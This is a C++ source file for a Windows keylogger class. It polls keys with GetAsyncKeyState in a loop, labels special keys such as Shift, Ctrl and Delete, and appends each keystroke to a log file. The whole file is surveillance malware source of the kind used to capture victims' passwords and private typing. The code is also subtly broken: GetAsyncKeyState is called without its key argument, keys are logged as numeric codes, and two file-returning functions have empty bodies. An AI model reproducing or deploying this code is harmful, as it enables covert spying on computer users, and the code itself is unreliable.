#include "keylogger.h"

void Keylogger::logToFile(const std::string key) {
      logFile.open(fileName, std::fstream::out | std::fstream::app);
      logFile << key;
}

void Keylogger::asciiInput() {
    while(execute) {
        for(char key = 8; key <= 190; ++key)
            if(GetAsyncKeyState() == -32767 && !actionInput(key))
                logToFile(std::to_string(key));

        Sleep(10);
    }

    logFile.close();
}

bool Keylogger::actionInput(const char key) {
    switch(key) {
        case VK_SPACE:
            logToFile(" ");
            break;

        case VK_RETURN:
            logToFile("\n");
            break;

        case VK_TAB:
            logToFile("\t");
            break;

        case VK_DELETE:
            logToFile("[DEL]");
            break;

        case VK_BACK:
            logToFile("[BACK]");
            break;

        case VK_SHIFT:
            logToFile("[SHIFT]");
            break;

        case VK_CONTROL:
            logToFile("[CTRL]");
            break;

        case VK_MENU:
            logToFile("[ALT]");
            break;

        default:
            return false;
            break;
    }

    return true;
}

std::fstream Keylogger::getRawFile(const std::string _fileName, bool encrypt) {

}

std::fstream Keylogger::getEditedFile(const std::string _fileName, bool encrypt) {

}
